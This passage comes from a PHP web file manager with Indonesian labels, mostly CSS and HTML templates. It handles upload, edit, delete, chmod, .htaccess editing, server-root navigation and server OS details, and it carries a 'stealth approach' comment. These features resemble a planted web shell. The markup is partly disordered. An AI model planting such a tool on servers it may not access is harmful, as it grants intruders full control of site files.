            header('Content-Length: ' . filesize($viewData['path']));
            echo $viewData['content'];
            exit;
        }
    }

    // Handle form submissions with stealth approach
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['upload'])) {
            $result = $fileManager->handleUpload();
            $message = $result;
        } elseif (isset($_POST['create_folder'])) {
            $result = $fileManager->handleCreateFolder();
            $message = $result;
        } elseif (isset($_POST['rename'])) {
            $result = $fileManager->handleRename();
            $message = $result;
        } elseif (isset($_POST['delete_path'])) {
            $result = $fileManager->handleDelete();
            $message = $result;
        } elseif (isset($_POST['save_edit'])) {
            $result = $fileManager->handleSaveEdit();
            $message = $result;
        } elseif (isset($_POST['create_file'])) {
            $result = $fileManager->handleCreateFile();
            $message = $result;
        } elseif (isset($_POST['change_permission'])) {
            $result = $fileManager->handleChangePermission();
            $message = $result;
        }
    }

    $currentPath = $fileManager->getCurrentPathValue();
    $breadcrumbs = $fileManager->getBreadcrumbs();
    $files = $fileManager->getFiles();
    
    // Handle server navigation
    $serverRoot = $fileManager->getServerRoot();
    $showTreeView = isset($_GET['tree']) && $_GET['tree'] === '1';
    $showSearch = isset($_GET['search']) && $_GET['search'] === '1';
    $searchQuery = isset($_GET['q']) ? trim($_GET['q']) : '';
    
    // Handle edit mode
    $editMode = isset($_GET['edit']);
    $editData = null;
    if ($editMode) {
        $editData = $fileManager->handleEdit();
        if ($editData === false) {
            $editMode = false;
        }
    }
    
    // Handle create file mode
    $createFileMode = isset($_GET['create_file']) && $_GET['create_file'] === '1';
    
    if ($showTreeView) {
        $directoryTree = $fileManager->getDirectoryTree();
    } else {
        $directoryTree = [];
    }
    
    if ($showSearch && !empty($searchQuery)) {
        $searchResults = $fileManager->searchFiles($searchQuery);
    } else {
        $searchResults = [];
    }
} catch (Exception $e) {
    // Fallback jika terjadi error
    $fileManager = null;
    $message = ['success' => false, 'message' => 'Terjadi error dalam sistem'];
    $currentPath = getcwd();
    $breadcrumbs = [];
    $files = [];
    $serverRoot = getcwd();
    $showTreeView = false;
    $showSearch = false;
    $searchQuery = '';
    $directoryTree = [];
    $searchResults = [];
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #333;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
        }

        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 20px;
        }

        .header-left {
            text-align: left;
        }

        .header-right {
            text-align: right;
        }

        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            font-weight: 300;
        }

        .admin-info {
            display: flex;
            align-items: center;
            gap: 15px;
            background: rgba(255, 255, 255, 0.1);
            padding: 10px 15px;
            border-radius: 10px;
            backdrop-filter: blur(5px);
        }

        .admin-username {
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            color: #fff;
        }

        .logout-btn {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 15px;
            background: rgba(220, 53, 69, 0.8);
            color: white;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 600;
            transition: all 0.3s ease;
            border: 1px solid rgba(220, 53, 69, 0.3);
        }

        .logout-btn:hover {
            background: rgba(220, 53, 69, 1);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
            color: white;
            text-decoration: none;
        }

        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                text-align: center;
            }
            
            .header-left, .header-right {
                text-align: center;
            }
            
            .admin-info {
                flex-direction: column;
                gap: 10px;
            }
        }

        .breadcrumb {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px 30px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
        }

        .breadcrumb a {
            color: #fff;
            text-decoration: none;
            transition: all 0.3s ease;
        }

        .breadcrumb a:hover {
            color: #ffd700;
            text-decoration: underline;
        }

        .content {
            padding: 30px;
        }

        .actions-panel {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
            background: #f8f9fa;
            padding: 20px;
            border-radius: 15px;
            border: 1px solid #e9ecef;
        }

        .action-group {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .action-group input[type="file"],
        .action-group input[type="text"] {
            flex: 1;
            padding: 12px 15px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .action-group input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .btn {
            padding: 12px 20px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .btn-success {
            background: linear-gradient(135deg, #56ab2f 0%, #a8e6cf 100%);
            color: white;
        }

        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(86, 171, 47, 0.3);
        }

        .btn-danger {
            background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
            color: white;
        }

        .btn-danger:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 65, 108, 0.3);
        }

        .btn-warning {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
        }

        .btn-warning:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(240, 147, 251, 0.3);
        }

        .btn-info {
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            color: white;
        }

        .btn-info:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(79, 172, 254, 0.3);
        }

        .btn-secondary {
            background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
            color: white;
        }

        .btn-secondary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(108, 117, 125, 0.3);
        }

        .file-table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        .file-table th {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px 15px;
            text-align: left;
            font-weight: 600;
            font-size: 14px;
        }

        .file-table td {
            padding: 15px;
            border-bottom: 1px solid #f1f3f4;
            vertical-align: middle;
        }

        .file-table tr:hover {
            background: #f8f9fa;
            transform: scale(1.01);
            transition: all 0.3s ease;
        }

        .file-name {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 500;
        }

        .file-name a {
            color: #667eea;
            text-decoration: none;
            transition: all 0.3s ease;
        }

        .file-name a:hover {
            color: #764ba2;
            text-decoration: underline;
        }

        .file-icon {
            font-size: 1.2em;
        }

        .file-actions {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }

        .file-actions form {
            display: inline;
        }

        .file-actions input[type="text"] {
            padding: 8px 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 12px;
            width: 120px;
        }

        .permissions {
            font-family: 'Courier New', monospace;
            font-size: 12px;
            color: #666;
        }

        .size {
            font-weight: 500;
            color: #555;
        }

        .modified {
            font-size: 12px;
            color: #888;
        }

        .alert {
            padding: 15px 20px;
            margin-bottom: 20px;
            border-radius: 10px;
            font-weight: 500;
        }

        .alert-success {
            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .alert-error {
            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .nav-tabs {
            display: flex;
            background: #f8f9fa;
            border-radius: 10px;
            padding: 5px;
            margin-bottom: 20px;
            border: 1px solid #e9ecef;
        }

        .nav-tab {
            flex: 1;
            padding: 12px 20px;
            text-align: center;
            text-decoration: none;
            color: #667eea;
            border-radius: 8px;
            transition: all 0.3s ease;
            font-weight: 500;
        }

        .nav-tab:hover {
            background: rgba(102, 126, 234, 0.1);
            color: #764ba2;
        }

        .nav-tab.active {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .tree-view {
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            max-height: 600px;
            overflow-y: auto;
        }

        .tree-item {
            margin: 5px 0;
            padding: 8px 12px;
            border-radius: 8px;
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .tree-item:hover {
            background: #f8f9fa;
        }

        .tree-item.directory {
            border-left: 3px solid #667eea;
        }

        .tree-item.file {
            border-left: 3px solid #28a745;
        }

        .tree-children {
            margin-left: 25px;
            border-left: 2px solid #e9ecef;
            padding-left: 15px;
        }

        .tree-toggle {
            cursor: pointer;
            margin-right: 8px;
            transition: transform 0.3s ease;
        }

        .tree-toggle.expanded {
            transform: rotate(90deg);
        }

        .search-panel {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 20px;
            border: 1px solid #e9ecef;
        }

        .search-form {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .search-form input[type="text"] {
            flex: 1;
            padding: 12px 15px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            font-size: 14px;
        }

        .search-form input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .search-results {
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        .server-info {
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-weight: 500;
        }

        .server-info h3 {
            margin: 0 0 10px 0;
            font-size: 1.2em;
        }

        .server-info p {
            margin: 5px 0;
            font-size: 0.9em;
        }

        .navigation-controls {
            background: #f8f9fa;
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #e9ecef;
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
        }

        .current-path {
            color: #666;
            font-size: 14px;
            font-family: 'Courier New', monospace;
            background: white;
            padding: 8px 12px;
            border-radius: 5px;
            border: 1px solid #ddd;
            flex: 1;
            min-width: 200px;
        }

        .edit-file-panel,
        .create-file-panel {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }

        .edit-header,
        .create-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 2px solid #f1f3f4;
        }

        .edit-header h3,
        .create-header h3 {
            margin: 0;
            color: #667eea;
            font-size: 1.5em;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }

        .form-control {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .form-control:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .code-editor {
            width: 100%;
            padding: 15px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            resize: vertical;
            min-height: 400px;
            background: #f8f9fa;
            transition: all 0.3s ease;
        }

        .code-editor:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
            background: white;
        }

        .form-text {
            font-size: 12px;
            color: #666;
            margin-top: 5px;
        }

        .form-actions {
            display: flex;
            gap: 15px;
            justify-content: flex-start;
            padding-top: 20px;
            border-top: 1px solid #e9ecef;
        }

        .form-actions .btn {
            min-width: 120px;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(5px);
        }

        .modal-content {
            background: white;
            margin: 2% auto;
            padding: 0;
            border-radius: 15px;
            width: 90%;
            max-width: 1000px;
            max-height: 90vh;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            animation: modalSlideIn 0.3s ease-out;
        }

        @keyframes modalSlideIn {
            from {
                opacity: 0;
                transform: translateY(-50px) scale(0.9);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .modal-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-header h3 {
            margin: 0;
            font-size: 1.3em;
        }

        .modal-close {
            background: none;
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
            padding: 5px;
            border-radius: 5px;
            transition: all 0.3s ease;
        }

        .modal-close:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        .modal-body {
            padding: 30px;
            max-height: 70vh;
            overflow-y: auto;
        }

        .file-content {
            background: #f8f9fa;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.6;
            white-space: pre-wrap;
            word-wrap: break-word;
            max-height: 60vh;
            overflow-y: auto;
            color: #333;
        }

        .file-content:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .file-content.htaccess {
            background: #1e1e1e;
            color: #d4d4d4;
            border-color: #333;
        }

        .file-content.htaccess:focus {
            border-color: #007acc;
            box-shadow: 0 0 0 3px rgba(0, 122, 204, 0.1);
        }

        .file-info {
            background: #e9ecef;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .file-info p {
            margin: 5px 0;
            color: #666;
        }

        .file-info strong {
            color: #333;
        }

        .modal-actions {
            padding: 20px 30px;
            background: #f8f9fa;
            border-top: 1px solid #e9ecef;
            display: flex;
            gap: 10px;
            justify-content: flex-end;
        }

        @media (max-width: 768px) {
            .actions-panel {
                grid-template-columns: 1fr;
            }
            
            .file-table {
                font-size: 12px;
            }
            
            .file-actions {
                flex-direction: column;
            }
            
            .file-actions input[type="text"] {
                width: 100%;
            }
            
            .edit-header,
            .create-header {
                flex-direction: column;
                gap: 15px;
                align-items: flex-start;
            }
            
            .form-actions {
                flex-direction: column;
            }
            
            .form-actions .btn {
                width: 100%;
            }
            
            .code-editor {
                min-height: 300px;
            }

            .modal-content {
                width: 95%;
                margin: 5% auto;
            }

            .modal-header {
                padding: 15px 20px;
            }

            .modal-body {
                padding: 20px;
            }

            .modal-actions {
                padding: 15px 20px;
                flex-direction: column;
            }

                    .modal-actions .btn {
            width: 100%;
        }

        /* Loading spinner */
        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: #667eea;
            font-style: italic;
        }
    }

    /* Tambahan CSS untuk tombol dan responsif */
    @media (min-width: 1024px) {
        .file-actions {
            flex-wrap: nowrap !important;
            gap: 8px !important;
            justify-content: flex-start;
        }
        .file-actions form, .file-actions a, .file-actions button {
            margin-bottom: 0 !important;
        }
        .file-table td {
            vertical-align: middle;
        }
    }
    @media (max-width: 1023px) {
        .file-actions {
            flex-direction: row !important;
            flex-wrap: wrap;
            gap: 8px !important;
            justify-content: flex-start;
        }
        .file-actions form, .file-actions a, .file-actions button {
            margin-bottom: 4px;
        }
    }
    .file-actions {
        display: flex;
        gap: 8px;
        flex-wrap: wrap;
        align-items: center;
    }
    .file-actions form, .file-actions a, .file-actions button {
        margin-bottom: 0;
    }
    .file-actions input[type="text"] {
        width: 90px;
        min-width: 70px;
        margin-right: 4px;
    }

    /* Perbaiki modal agar responsif */
    @media (min-width: 1024px) {
        .modal-content { max-width: 800px; }
    }
    @media (max-width: 1023px) {
        .modal-content { max-width: 98vw; }
    }
</style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-content">
                <div class="header-left">
                    <h1><i class="fas fa-folder-open"></i> File Manager</h1>
                    <p>Kelola file dan folder dengan mudah</p>
                </div>
                <div class="header-right">
                    <div class="admin-info">
                        <span class="admin-username">
                            <i class="fas fa-user-shield"></i>
                            <?php echo htmlspecialchars($_SESSION['admin_username'] ?? 'Admin'); ?>
                        </span>
                        <a href="?admin_logout=1" class="logout-btn" title="Logout">
                            <i class="fas fa-sign-out-alt"></i>
                            Logout
                        </a>
                    </div>
                </div>
            </div>
        </div>

        <div class="breadcrumb">
            <?php if ($fileManager): ?>
                <?php foreach ($breadcrumbs as $index => $crumb): ?>
                    <?php if ($index > 0): ?>
                        / 
                    <?php endif; ?>
                    <a href="?d=<?= urlencode($crumb['path']) ?>"><?= sanitizePath($crumb['name']) ?></a>
                <?php endforeach; ?>
            <?php else: ?>
                <a href="?d=<?= urlencode(getcwd()) ?>">Home</a>
            <?php endif; ?>
        </div>

        <div class="content">
            <?php if ($message): ?>
                <div class="alert alert-<?= $message['success'] ? 'success' : 'error' ?>">
                    <i class="fas fa-<?= $message['success'] ? 'check-circle' : 'exclamation-circle' ?>"></i>
                    <?= $message['message'] ?>
                </div>
            <?php endif; ?>

            <?php if ($fileManager): ?>
                <!-- Server Info -->
                <div class="server-info">
                    <h3><i class="fas fa-server"></i> Informasi Server</h3>
                    <p><strong>Root Path:</strong> <?= sanitizePath($serverRoot) ?></p>
                    <p><strong>Current Path:</strong> <?= sanitizePath($currentPath) ?></p>
                    <p><strong>Server OS:</strong> <?= php_uname('s') ?> <?= php_uname('r') ?></p>
                    <p><strong>PHP Version:</strong> <?= PHP_VERSION ?></p>
                </div>

                <!-- Navigation Tabs -->
                <div class="nav-tabs">
                    <a href="?" class="nav-tab <?= !$showTreeView && !$showSearch && !$editMode && !$createFileMode ? 'active' : '' ?>">
                        <i class="fas fa-folder"></i> File Manager
                    </a>
                    <a href="?tree=1" class="nav-tab <?= $showTreeView ? 'active' : '' ?>">
                        <i class="fas fa-sitemap"></i> Tree View
                    </a>
                    <a href="?search=1" class="nav-tab <?= $showSearch ? 'active' : '' ?>">
                        <i class="fas fa-search"></i> Search Files
                    </a>
                    <a href="?create_file=1" class="nav-tab <?= $createFileMode ? 'active' : '' ?>">
                        <i class="fas fa-file-plus"></i> Create File
                    </a>
                </div>

                <?php if ($showTreeView): ?>
                    <!-- Tree View -->
                    <div class="tree-view">
                        <h3><i class="fas fa-sitemap"></i> Directory Tree (<?= sanitizePath($serverRoot) ?>)</h3>
                        <div style="margin-bottom: 15px;">
                            <button onclick="expandAll()" class="btn btn-info" style="margin-right: 10px;">
                                <i class="fas fa-expand"></i> Expand All
                            </button>
                            <button onclick="collapseAll()" class="btn btn-warning">
                                <i class="fas fa-compress"></i> Collapse All
                            </button>
                        </div>
                        <div id="directory-tree">
                            <?php echo renderTreeView($directoryTree, $fileManager); ?>
                        </div>
                    </div>
                <?php elseif ($showSearch): ?>
                    <!-- Search Panel -->
                    <div class="search-panel">
                        <form method="GET" class="search-form">
                            <input type="hidden" name="search" value="1">
                            <input type="text" name="q" value="<?= sanitizePath($searchQuery) ?>" placeholder="Cari file atau folder..." required>
                            <button type="submit" class="btn btn-primary">
                                <i class="fas fa-search"></i> Cari
                            </button>
                        </form>
                    </div>

                    <?php if (!empty($searchQuery)): ?>
                        <!-- Search Results -->
                        <div class="search-results">
                            <h3><i class="fas fa-search"></i> Hasil Pencarian untuk "<?= sanitizePath($searchQuery) ?>"</h3>
                            <?php if (!empty($searchResults)): ?>
                                <table class="file-table">
                                    <thead>
                                        <tr>
                                            <th><i class="fas fa-file"></i> Nama</th>
                                            <th><i class="fas fa-map-marker-alt"></i> Path</th>
                                            <th><i class="fas fa-shield-alt"></i> Permission</th>
                                            <th><i class="fas fa-weight-hanging"></i> Ukuran</th>
                                            <th><i class="fas fa-calendar"></i> Dimodifikasi</th>
                                            <th><i class="fas fa-cogs"></i> Aksi</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php foreach ($searchResults as $file): ?>
                                            <tr>
                                                <td>
                                                    <div class="file-name">
                                                        <span class="file-icon"><?= $file['icon'] ?></span>
                                                        <?php if ($file['isDir']): ?>
                                                            <a href="?d=<?= urlencode($file['path']) ?>"><?= sanitizePath($file['name']) ?></a>
                                                        <?php else: ?>
                                                            <span><?= sanitizePath($file['name']) ?></span>
                                                        <?php endif; ?>
                                                    </div>
                                                </td>
                                                <td><span class="size"><?= sanitizePath($file['relativePath']) ?></span></td>
                                                <td>
                                                    <span class="permissions" title="<?= $fileManager->getPermissionDescription($file['path']) ?>">
                                                        <?= $file['permissions'] ?> (<?= $fileManager->getPermissionNumeric($file['path']) ?>)
                                                    </span>
                                                </td>
                                                <td><span class="size"><?= $file['size'] ?></span></td>
                                                <td><span class="modified"><?= $file['modified'] ?></span></td>
                                                <td>
                                                    <div class="file-actions">
                                                        <?php if ($file['isDir']): ?>
                                                            <a href="?d=<?= urlencode($file['path']) ?>" class="btn btn-primary">
                                                                <i class="fas fa-folder-open"></i>
                                                            </a>
                                                        <?php else: ?>
                                                            <button type="button" class="btn btn-info" onclick="viewFile('<?= urlencode($file['path']) ?>', '<?= sanitizePath($file['name']) ?>')">
                                                                <i class="fas fa-eye"></i>
                                                            </button>
                                                            <?php 
                                                            $isHtaccess = ($file['name'] === '.htaccess');
                                                            $extension = strtolower(pathinfo($file['path'], PATHINFO_EXTENSION));
                                                            if (($isHtaccess || in_array($extension, $fileManager->getAllowedExtensions())) && is_writable($file['path'])): 
                                                            ?>
                                                                <a href="?edit=<?= urlencode($file['path']) ?>" class="btn btn-warning">
                                                                    <i class="fas fa-edit"></i>
                                                                </a>
                                                            <?php endif; ?>
                                                        <?php endif; ?>
                                                        
                                                        <!-- Permission Control -->
                                                        <form method="POST" style="display: inline;">
                                                            <input type="hidden" name="permission_path" value="<?= sanitizePath($file['path']) ?>">
                                                            <input type="text" name="permission_mode" placeholder="755" value="<?= $fileManager->getPermissionNumeric($file['path']) ?>" style="width: 60px;" title="Format: 3 digit (0-7) contoh: 755, 644, 777">
                                                            <button type="submit" name="change_permission" class="btn btn-info" title="Ubah Permission">
                                                                <i class="fas fa-shield-alt"></i>
                                                            </button>
                                                        </form>
                                                    </div>
                                                </td>
                                            </tr>
                                        <?php endforeach; ?>
                                    </tbody>
                                </table>
                            <?php else: ?>
                                <p style="text-align: center; color: #666; padding: 40px;">
                                    <i class="fas fa-search"></i> Tidak ada hasil ditemukan untuk "<?= sanitizePath($searchQuery) ?>"
                                </p>
                            <?php endif; ?>
                        </div>
                    <?php endif; ?>
                <?php elseif ($editMode && $editData): ?>
                    <!-- Edit File Mode -->
                    <div class="edit-file-panel">
                        <div class="edit-header">
                            <h3><i class="fas fa-edit"></i> Edit File: <?= sanitizePath($editData['name']) ?></h3>
                            <a href="?" class="btn btn-info">
                                <i class="fas fa-arrow-left"></i> Kembali ke File Manager
                            </a>
                        </div>
                        
                        <form method="POST" class="edit-form">
                            <input type="hidden" name="edit_path" value="<?= sanitizePath($editData['path']) ?>">
                            <div class="form-group">
                                <label for="file_content">Konten File:</label>
                                <textarea id="file_content" name="file_content" rows="20" class="code-editor" placeholder="Tulis konten file di sini..."><?= htmlspecialchars($editData['content']) ?></textarea>
                            </div>
                            <div class="form-actions">
                                <button type="submit" name="save_edit" class="btn btn-success">
                                    <i class="fas fa-save"></i> Simpan File
                                </button>
                                <a href="?" class="btn btn-warning">
                                    <i class="fas fa-times"></i> Batal
                                </a>
                            </div>
                        </form>
                    </div>
                <?php elseif ($createFileMode): ?>
                    <!-- Create File Mode -->
                    <div class="create-file-panel">
                        <div class="create-header">
                            <h3><i class="fas fa-file-plus"></i> Buat File Baru</h3>
                            <a href="?" class="btn btn-info">
                                <i class="fas fa-arrow-left"></i> Kembali ke File Manager
                            </a>
                        </div>
                        
                        <form method="POST" class="create-form">
                            <div class="form-group">
                                <label for="file_name">Nama File:</label>
                                <input type="text" id="file_name" name="file_name" placeholder="contoh.txt" required class="form-control">
                                <small class="form-text">Ekstensi yang didukung: <?= implode(', ', $fileManager->getAllowedExtensions()) ?></small>
                            </div>
                            <div class="form-group">
                                <label for="file_content">Konten File:</label>
                                <textarea id="file_content" name="file_content" rows="20" class="code-editor" placeholder="Tulis konten file di sini..."></textarea>
                            </div>
                            <div class="form-actions">
                                <button type="submit" name="create_file" class="btn btn-success">
                                    <i class="fas fa-plus"></i> Buat File
                                </button>
                                <a href="?" class="btn btn-warning">
                                    <i class="fas fa-times"></i> Batal
                                </a>
                            </div>
                        </form>
                    </div>
                <?php else: ?>
                    <!-- Regular File Manager -->
                    <!-- Navigation Controls -->
                    <div class="navigation-controls">
                        <?php if ($fileManager->getParentDirectory()): ?>
                            <a href="?d=<?= urlencode($fileManager->getParentDirectory()) ?>" class="btn btn-info">
                                <i class="fas fa-level-up-alt"></i> Parent Directory
                            </a>
                        <?php endif; ?>
                        <a href="?d=<?= urlencode($serverRoot) ?>" class="btn btn-primary">
                            <i class="fas fa-home"></i> Server Root
                        </a>
                        <span class="current-path">
                            <i class="fas fa-map-marker-alt"></i> <?= sanitizePath($currentPath) ?>
                        </span>
                        <div style="display: flex; gap: 5px; align-items: center;">
                            <?php if ($fileManager->canWriteToDirectory($currentPath)): ?>
                                <span style="color: #28a745; font-size: 12px;">
                                    <i class="fas fa-check-circle"></i> Writable
                                </span>
                            <?php else: ?>
                                <span style="color: #dc3545; font-size: 12px;">
                                    <i class="fas fa-times-circle"></i> Read Only
                                </span>
                                        <?php endif; ?>
        </div>
    </div>

    <!-- File View Modal -->
    <div id="fileModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-file-alt"></i> <span id="modalFileName"></span></h3>
                <button type="button" class="modal-close" onclick="closeModal()">&times;</button>
            </div>
            <div class="modal-body">
                <div class="file-info">
                    <p><strong>Path:</strong> <span id="modalFilePath"></span></p>
                    <p><strong>Size:</strong> <span id="modalFileSize"></span></p>
                    <p><strong>Modified:</strong> <span id="modalFileModified"></span></p>
                    <p><strong>Permissions:</strong> <span id="modalFilePermissions"></span></p>
                    <p><strong>Extension:</strong> <span id="modalFileExtension"></span></p>
                    <p><strong>Lines:</strong> <span id="modalFileLines"></span> | <strong>Characters:</strong> <span id="modalFileChars"></span></p>
                    <p id="htaccessInfo" style="display: none;"><strong>Type:</strong> <span id="htaccessDescription"></span></p>
                </div>
                <div class="form-group">
                    <label for="modalFileContent">File Content:</label>
                    <textarea id="modalFileContent" class="file-content" readonly></textarea>
                </div>
            </div>
            <div class="modal-actions">
                <button type="button" class="btn btn-warning" onclick="editFileFromModal()">
                    <i class="fas fa-edit"></i> Edit File
                </button>
                <button type="button" class="btn btn-info" onclick="downloadFile()">
                    <i class="fas fa-download"></i> Download
                </button>
                <button type="button" id="htaccessHelpBtn" class="btn btn-info" onclick="showHtaccessHelp()" style="display: none;">
                    <i class="fas fa-question-circle"></i> .htaccess Help
                </button>
                <button type="button" class="btn btn-secondary" onclick="closeModal()">
                    <i class="fas fa-times"></i> Close
                </button>
            </div>
        </div>
    </div>

                    <div class="actions-panel">
                        <div class="action-group">
                            <form method="POST" enctype="multipart/form-data" style="display: flex; gap: 10px; width: 100%;">
                                <input type="file" name="uploaded_file" required>
                                <button type="submit" name="upload" class="btn btn-primary">
                                    <i class="fas fa-upload"></i> Upload
                                </button>
                            </form>
                        </div>
                        
                        <div class="action-group">
                            <form method="POST" style="display: flex; gap: 10px; width: 100%;">
                                <input type="text" name="folder_name" placeholder="Nama folder baru" required>
                                <button type="submit" name="create_folder" class="btn btn-success">
                                    <i class="fas fa-folder-plus"></i> Buat Folder
                                </button>
                            </form>
                        </div>
                        
                        <div class="action-group">
                            <a href="?create_file=1" class="btn btn-info" style="width: 100%; text-align: center;">
                                <i class="fas fa-file-plus"></i> Buat File Baru
                            </a>
                        </div>
                    </div>

                    <table class="file-table">
                        <thead>
                            <tr>
                                <th><i class="fas fa-file"></i> Nama</th>
                                <th><i class="fas fa-shield-alt"></i> Permission</th>
                                <th><i class="fas fa-weight-hanging"></i> Ukuran</th>
                                <th><i class="fas fa-calendar"></i> Dimodifikasi</th>
                                <th><i class="fas fa-cogs"></i> Aksi</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php if (!empty($files)): ?>
                                <?php foreach ($files as $file): ?>
                                    <tr>
                                        <td>
                                            <div class="file-name">
                                                <span class="file-icon"><?= $file['icon'] ?></span>
                                                <?php if ($file['isDir']): ?>
